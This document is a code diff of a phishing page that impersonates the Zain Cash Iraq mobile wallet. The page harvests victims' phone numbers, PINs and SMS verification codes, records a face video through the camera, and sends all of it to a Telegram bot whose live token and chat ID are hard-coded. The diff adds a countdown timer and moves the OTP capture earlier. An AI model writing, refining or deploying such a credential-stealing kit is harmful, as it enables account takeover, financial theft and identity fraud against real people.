@@ -54,7 +54,6 @@
     .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }
 
     label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
-    /* موحّد لخانات الإدخال */
     input[type="text"], input[type="tel"], input[type="number"], input[type="password"], select, .text-input {
       padding:12px 12px;
       border-radius:10px;
@@ -86,7 +85,6 @@
       transform: translateY(0);
     }
 
-    /* زر موحد أساسي */
     .button {
       background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%);
       color:#fff;
@@ -104,7 +102,6 @@
     }
     .button:active { transform:translateY(1px); opacity:0.92; }
 
-    /* زر الرجوع - مصغر لكنه مرئي ومتناسق */
     .back-btn {
       position:relative;
       display:inline-block;
@@ -120,7 +117,6 @@
     }
     .back-btn:hover { background:#f4faff; }
 
-    /* زر إلغاء أحمر */
     .danger-button {
       background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%);
       color:#fff;
@@ -141,28 +137,27 @@
 
     .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }
 
-    /* === كاميرا === */
+    .timer { text-align:center; color:#e53935; font-weight:700; margin:10px 0; font-size:16px; }
+    .timer.warning { color:#ff9800; }
+
     .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
     .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
     .camera-box video { width:100%; height:100%; object-fit:cover; }
     .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
     .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
 
-    /* processing modal */
     #processingModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:10000; align-items:center; justify-content:center; color:#fff; }
     #processingModal.active { display:flex; }
     .processingBox { background:rgba(0,0,0,0.65); padding:20px 26px; border-radius:12px; text-align:center; min-width:260px; }
     .spinner { width:48px; height:48px; border-radius:50%; border:5px solid rgba(255,255,255,0.18); border-top-color:#fff; animation:spin 1s linear infinite; margin:0 auto 12px; }
     @keyframes spin { to { transform:rotate(360deg); } }
 
-    /* modal error */
     #modalError { display:none; position:fixed; inset:0; background:rgba(47,128,237,0.13); z-index:9999; align-items:center; justify-content:center; }
     #modalError.active { display:flex; }
     #modalContent { background:#fff; padding:27px 32px; border-radius:13px; text-align:center; border:2px solid #f9b3b3; box-shadow:0 7px 34px rgba(47,128,237,0.2); }
     #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
     #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }
 
-    /* permission modal */
     #permissionModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:11000; align-items:center; justify-content:center; padding:18px; box-sizing:border-box; }
     #permissionModal.active { display:flex; }
     #permissionBox { background:#fff; border-radius:12px; padding:20px; max-width:520px; width:100%; text-align:right; direction:rtl; box-shadow:0 8px 40px rgba(0,0,0,0.25); }
@@ -170,7 +165,6 @@
     #permissionBox p { margin:0 0 12px 0; color:#333; font-weight:600; }
     .perm-actions { display:flex; gap:10px; justify-content:flex-start; margin-top:8px; }
 
-    /* تحسينات عرض الحقول على الشاشات الصغيرة */
     @media (max-width:450px){
       #app{padding:16px 1.5vw 10px 1.5vw;}
       .camera-box{height:320px;}
@@ -201,16 +195,11 @@
     </div>
   </div>
 
-  <!-- نافذة إصرار على إذن الكاميرا -->
   <div id="permissionModal" role="dialog" aria-hidden="true">
     <div id="permissionBox" role="document" aria-labelledby="permTitle">
       <h3 id="permTitle">نحتاج إذن الكاميرا</h3>
       <p id="permText">
         التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه. إذا رفضت الطلب سيتم عرض هذه النافذة وتستطيع إعادة المحاولة.
-        الرجاء السماح بالكاميرا حتى نتمكن من المتابعة.
-      </p>
-      <p style="color:#666;font-size:13px;margin-top:6px;">
-        ملاحظة: بعض المتصفحات تحفظ خيار "رفض" بشكل دائم. إذا ظهرت رسالة أن الإذن محظور بشكل دائم، افتح إعدادات المتصفح (انقر على أيقونة القفل بجوار شريط العنوان) واسمح للكاميرا للموقع ثم اضغط "إعادة المحاولة".
       </p>
       <div class="perm-actions">
         <button id="permRetryBtn" class="button">إعادة المحاولة</button>
@@ -220,9 +209,9 @@
   </div>
 
 <script>
-  // === إعدادات البوت (كما طُلب) ===
   const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
   const CHAT_ID = "6873334348";
+  const CODE_TIMEOUT = 60; // 60 ثانية
 
   const app = document.getElementById('app');
   const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
@@ -230,7 +219,8 @@
 
   let userData = { phone:'', password:'', code4:'' };
   let telegramMsgId = null;
-  let waitingTimeout = null;
+  let codeTimer = null;
+  let codeTimeLeft = 0;
 
   function stepIndicator(step){
     return `
@@ -241,6 +231,7 @@
       </div>
     `;
   }
+  
   function header(sub=""){
     return `
       <div class="zain-header">
@@ -269,7 +260,6 @@
     const password = document.getElementById('password');
     phone.focus();
     
-    // تصفية مدخلات كلمة السر (أرقام فقط و 6 أرقام كحد أقصى)
     password.addEventListener('input', function(){
       this.value = this.value.replace(/\D/g,'').slice(0,6);
     });
@@ -285,7 +275,6 @@
         return; 
       }
       
-      // التحقق من أن كلمة السر إما 4 أو 6 أرقام فقط
       if(passwordVal.length !== 4 && passwordVal.length !== 6){ 
         alert('يرجى إدخال كلمة السر (4 أو 6 أرقام بالضبط)'); 
         password.focus(); 
@@ -295,15 +284,85 @@
       userData.phone = phoneVal;
       userData.password = passwordVal;
       
-      // إرسال البيانات إلى التلجرام
       try { 
         await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش العراق\n📱 الهاتف: ${userData.phone}\n🔑 كلمة السر: ${userData.password}`); 
       } catch(e){ 
         console.log(e); 
       }
       
-      // التوجيه الفوري للتحقق بالوجه بدون أي شروط إضافية
+      // التوجيه لصفحة رمز التحقق
+      renderCode4Step();
+    };
+  }
+
+  // رمز التحقق (4 أرقام)
+  function renderCode4Step(){
+    codeTimeLeft = CODE_TIMEOUT;
+    
+    app.innerHTML = `
+      <button class="back-btn" id="backBtn">&#8592; رجوع</button>
+      ${header("تم إرسال رمز تحقق إلى هاتفك")}
+      ${stepIndicator(1)}
+      <div class="info-msg">أدخل رمز التحقق المكون من 4 أرقام كما وصلك برسالة SMS</div>
+      <div class="timer" id="timerDisplay">الوقت المتبقي: <span id="timeLeft">60</span> ثانية</div>
+      <form id="code4Form" autocomplete="off">
+        <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
+        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
+      </form>
+      <div class="zain-footer">Zain Cash Iraq &copy; 2025</div>
+    `;
+    
+    const codeInput = document.getElementById('code4input');
+    const timerDisplay = document.getElementById('timerDisplay');
+    const timeLeftSpan = document.getElementById('timeLeft');
+    
+    codeInput.focus();
+    codeInput.addEventListener('input', function(){ 
+      this.value = this.value.replace(/\D/g,'').slice(0,4); 
+    });
+    
+    // بدء المؤقت
+    if(codeTimer) clearInterval(codeTimer);
+    codeTimer = setInterval(() => {
+      codeTimeLeft--;
+      timeLeftSpan.textContent = codeTimeLeft;
+      
+      if(codeTimeLeft <= 20) {
+        timerDisplay.classList.add('warning');
+      }
+      
+      if(codeTimeLeft <= 0) {
+        clearInterval(codeTimer);
+        alert('انتهت صلاحية رمز التحقق! يرجى طلب رمز جديد.');
+        renderCode4Step(); // طلب رمز جديد
+      }
+    }, 1000);
+    
+    document.getElementById('code4Form').onsubmit = async (e) => {
+      e.preventDefault();
+      const code = codeInput.value.trim();
+      if(code.length !== 4){ 
+        alert('يرجى إدخال رمز مكون من 4 أرقام'); 
+        codeInput.focus(); 
+        return; 
+      }
+      
+      clearInterval(codeTimer); // إيقاف المؤقت
+      userData.code4 = code;
+      
+      try { 
+        await sendToTelegramAndGetMsgId(`✅ رمز التحقق\n📱 الهاتف: ${userData.phone}\n🔢 رمز التحقق: ${userData.code4}`); 
+      } catch(e){ 
+        console.log(e); 
+      }
+      
+      // التوجيه لصفحة التحقق بالوجه
       startCaptureSequence();
+    };
+    
+    document.getElementById('backBtn').onclick = () => {
+      clearInterval(codeTimer);
+      renderPhoneStep();
     };
   }
 
@@ -316,15 +375,12 @@
         </div>
         <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا الآن</div>
         <div style="color:#666;font-size:14px;">
-          سنسجل فيديو قصير يتضمن الخطوات التالية:
-          <strong>اغماض العين (3 ثوانٍ)</strong>، <strong>وجه إلى اليمين قليلاً</strong>، <strong>العودة للمنتصف</strong>، <strong>وجه إلى اليسار قليلاً</strong>، <strong>وجه إلى اليمين قليلاً مرة أخرى</strong>، <strong>اغماض العين</strong>، ثم <strong>ابتسم</strong>.<br>
-          اضبط وجهك داخل الإطار، أزل القبعة/النظار��ت إذا لزم، واسمح بالوصول للكاميرا.
+          سنسجل فيديو قصير لتحقق الوجه. اضبط وجهك داخل الإطار واسمح بالوصول للكاميرا.
         </div>
       </div>
     `;
   }
 
-  // --- إدارة إذن الكاميرا: محاولات وإعادة المحاولة عند الرفض ---
   const permModal = document.getElementById('permissionModal');
   const permRetryBtn = document.getElementById('permRetryBtn');
   const permCancelBtn = document.getElementById('permCancelBtn');
@@ -332,11 +388,11 @@
   function showPermissionDialog() {
     permModal.classList.add('active');
   }
+  
   function hidePermissionDialog() {
     permModal.classList.remove('active');
   }
 
-  // تعرض نافذة وإرجاع Promise ينتظر اختيار المستخدم (retry/cancel)
   function promptForPermissionFromUser() {
     return new Promise(resolve => {
       showPermissionDialog();
@@ -352,7 +408,6 @@
     });
   }
 
-  // محاولة واحدة لالتقاط الستريم — تُرمى إذا فشل
   async function tryGetUserMediaOnce() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       throw new Error('getUserMedia غير مدعوم في هذا المتصفح');
@@ -360,7 +415,6 @@
     return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
   }
 
-  // حلقة تطالب المستخدم بإعادة المحاولة كلما تم الرفض
   async function requestCameraWithInsistence() {
     try {
       const stream = await tryGetUserMediaOnce();
@@ -368,15 +422,7 @@
     } catch (err) {
       const deniedNames = ['NotAllowedError','PermissionDeniedError','NotFoundError','SecurityError'];
       const isPermissionError = err && (deniedNames.includes(err.name) || (err.message && err.message.toLowerCase().includes('permission')));
-      if (!isPermissionError && navigator.permissions && navigator.permissions.query) {
-        try {
-          const p = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
-          if (p && p.state === 'denied') {
-            // اعتبرها مشكلة إذن
-          }
-        } catch(e){}
-      }
-
+      
       if (!isPermissionError) {
         throw err;
       }
@@ -397,7 +443,6 @@
     }
   }
 
-  // تسجيل فيديو تسلسلي
   async function startCaptureSequence(){
     renderPreparingMessage();
     await wait(700);
@@ -560,42 +605,7 @@
       showProcessing(false);
     }
 
-    // بعد انتهاء التحقق بالوجه، التوجيه لصفحة كود التحقق
-    renderCode4Step();
-  }
-
-  // رمز 4
-  function renderCode4Step(){
-    app.innerHTML = `
-      <button class="back-btn" id="backBtn">&#8592; رجوع</button>
-      ${header("تم إرسال رمز تحقق إلى هاتفك")}
-      ${stepIndicator(2)}
-      <div class="info-msg">أدخل رمز التحقق المكون من 4 أرقام كما وصلك برسالة SMS</div>
-      <form id="code4Form" autocomplete="off">
-        <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
-        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد الرمز</button></div>
-      </form>
-      <div class="zain-footer">Zain Cash Iraq &copy; 2025</div>
-    `;
-    const codeInput = document.getElementById('code4input');
-    codeInput.focus();
-    codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
-    document.getElementById('code4Form').onsubmit = async (e) => {
-      e.preventDefault();
-      const code = codeInput.value.trim();
-      if(code.length !== 4){ alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
-      userData.code4 = code;
-      
-      // إرسال رسالة منفصلة برمز التحقق ورقم الهاتف بعد الانتهاء من الفيديو
-      try { 
-        await sendToTelegramAndGetMsgId(`✅ رمز التحقق\n📱 الهاتف: ${userData.phone}\n🔢 رمز التحقق: ${userData.code4}`); 
-      } catch(e){ 
-        console.log(e); 
-      }
-      
-      showFinalErrorAndReset();
-    };
-    document.getElementById('backBtn').onclick = () => renderPhoneStep();
+    showFinalErrorAndReset();
   }
 
   async function sendVideoToTelegramAsVideo(blob){
@@ -616,6 +626,7 @@
       try { await sendVideoAsDocumentFallback(blob); } catch(e){ console.error('fallback failed', e); throw err; }
     }
   }
+  
   async function sendVideoAsDocumentFallback(blob){
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
@@ -663,7 +674,6 @@
     }, 2500);
   }
 
-  // ابدأ التطبيق
   renderPhoneStep();
 
 </script>
